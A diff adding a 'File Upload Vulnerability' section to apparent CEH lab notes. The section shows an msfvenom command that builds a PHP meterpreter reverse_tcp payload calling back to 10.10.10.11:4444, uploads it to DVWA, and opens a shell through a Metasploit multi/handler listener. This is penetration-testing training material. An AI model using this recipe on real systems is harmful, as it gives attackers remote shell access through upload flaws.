@@ -81,6 +81,72 @@ uniscan -u http://10.10.10.12:8080/CEH -we  # this will search for robots.txt
 
 
 
+----------------------------------------------------------------------
+
+
+File Upload Vulnerability
+
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw 
+
+
+This command will generate a php raw payload 
+
+
+Copy payload and save it in leafpad save it 
+upload.php 
+
+open website which want to upload file on here DVWA and upload file
+you will get link below copy it and open it on another page
+
+
+on kali go and open 
+msfconsole
+
+Type use multi/handler and hit Enter. 
+○ Type set payload php/meterpreter/reverse_tcp and hit Enter. 
+○ Type set lhost 10.10.10.11 and hit Enter. 
+○ Type set lport 4444 and hit Enter. 
+○ Now to start the listener typing run and hit Enter. 
+
+
+Will meterprter open now
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
